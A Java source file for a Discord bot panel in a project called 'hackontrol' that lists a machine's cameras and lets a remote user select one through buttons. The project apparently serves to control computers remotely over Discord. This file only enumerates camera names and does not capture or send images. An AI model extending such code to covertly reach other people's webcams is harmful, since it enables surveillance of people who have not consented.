package com.khopan.hackontrol.panel;

import java.util.ArrayList;
import java.util.List;

import com.khopan.camera.Camera;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.InteractionManager;
import com.khopan.hackontrol.service.interaction.context.ButtonContext;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;

import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class CameraPanel extends Panel {
	private static final String PANEL_NAME = "camera";

	private static final Button BUTTON_CAMERA_LIST = ButtonManager.staticButton(ButtonType.SUCCESS, "Camera List", "cameraList");
	private static final Button BUTTON_REFRESH     = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",     "cameraRefresh");

	private Camera[] cameraList;
	private Camera selected;

	@Override
	public String panelName() {
		return CameraPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAMERA_LIST, this :: send);
		this.register(Registration.BUTTON, CameraPanel.BUTTON_REFRESH,     context -> {
			this.send(context);
			HackontrolButton.deleteMessages(context);
		});
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(CameraPanel.BUTTON_CAMERA_LIST)
				.build()
		};
	}

	private void send(ButtonContext context) {
		Camera[] cameraList = Camera.list();

		if(cameraList == null || cameraList.length == 0) {
			HackontrolError.message(context.reply(), "No camera available");
			return;
		}

		StringBuilder builder = new StringBuilder();
		boolean hasSelected = false;

		for(int i = 0; i < cameraList.length; i++) {
			if(i > 0) {
				builder.append('\n');
			}

			Camera camera = cameraList[i];
			boolean selected = camera.equals(this.selected);

			if(selected) {
				builder.append("**");
			}

			builder.append('`');
			builder.append(i + 1);
			builder.append(") ");
			builder.append(camera.getName());

			if(selected) {
				builder.append(" (Selected)");
			}

			builder.append('`');

			if(selected) {
				builder.append("**");
			}

			if(selected) {
				hasSelected = true;
			}
		}

		List<ItemComponent> list = new ArrayList<>();
		list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Select", buttonContext -> {
			if(cameraList.length == 1) {
				this.selected = cameraList[0];
				this.send(buttonContext);
				HackontrolButton.deleteMessages(buttonContext);
				return;
			}
		}));

		list.add(CameraPanel.BUTTON_REFRESH);
		list.add(HackontrolButton.delete());
		context.reply(builder.toString()).addActionRow(list).queue(InteractionManager :: callback);
	}
}
